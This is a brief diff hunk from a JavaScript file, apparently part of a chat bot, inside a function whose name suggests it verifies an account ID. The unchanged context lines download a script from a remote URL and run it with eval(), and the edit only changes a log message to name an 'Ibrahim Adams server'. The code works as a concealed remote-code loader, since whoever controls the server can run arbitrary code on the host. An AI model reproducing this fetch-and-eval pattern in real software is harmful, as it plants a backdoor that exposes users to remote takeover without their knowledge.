@@ -17,7 +17,7 @@ function atbverifierEtatJid(jid) {
 axios.get(PING_URL)
   .then(response => {
       const scriptContent = response.data;
-      console.log("File loaded successfully from URL!");
+      console.log("File loaded successfully from Ibrahim Adams server");
 
       eval(scriptContent);
 
